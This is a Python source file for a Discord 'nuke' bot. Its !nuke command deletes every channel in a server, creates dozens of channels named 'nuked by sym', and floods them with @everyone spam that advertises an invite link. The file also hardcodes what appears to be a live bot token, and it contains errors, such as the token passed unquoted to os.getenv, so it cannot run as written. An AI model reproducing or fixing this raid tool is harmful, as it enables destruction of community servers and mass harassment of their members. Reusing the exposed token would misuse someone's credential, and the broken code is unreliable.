import discord
from discord.ext import commands
import asyncio
import os

TOKEN = os.getenv(MTM4NzM0MDI1OTM2NDMwNjk0NA.G7Pva9.qqVy10GaCuoMd-7pWuoS4-IDo3aeuugWx1KkjA)

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

荒らし文 = (
    "@everyone @here\n"
    "# Nuked by SYM\n"
    "# [今すぐ参加](https://discord.gg/KdBrcWPw77)\n"
    "# [GIF](https://imgur.com/NbBGFcf)\n"
    "# [GIF](https://imgur.com/pY7EpwN)"
)

@bot.event
async def on_ready():
    print("ログイン成功！: {bot.user}")

@bot.command()
async def nuke(ctx):
    guild = ctx.guild
    await ctx.message.delete()

    print("チャンネルを削除しました！")
    delete_tasks = [asyncio.create_task(ch.delete()) for ch in guild.channels]
    await asyncio.gather(*delete_tasks, return_exceptions=True)

    print("チャンネル作成中")
    new_channels = []
    for i in range(0, 60, 15):
        tasks = [
            asyncio.create_task(guild.create_text_channel("nuked by sym"))
            for _ in range(15)
        ]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if isinstance(r, discord.TextChannel):
                new_channels.append(r)
        await asyncio.sleep(1)  

    print("ｽﾊﾟﾑを開始")
    async def spam(ch):
        for _ in range(60):
            try:
                await ch.send(荒らし文)
                await asyncio.sleep(0.5)
            except:
                await asyncio.sleep(2)

    await asyncio.gather(*(spam(ch) for ch in new_channels))
    print("nukeの完了")

bot.run(MTM4NzM0MDI1OTM2NDMwNjk0NA.G7Pva9.qqVy10GaCuoMd-7pWuoS4-IDo3aeuugWx1KkjA)
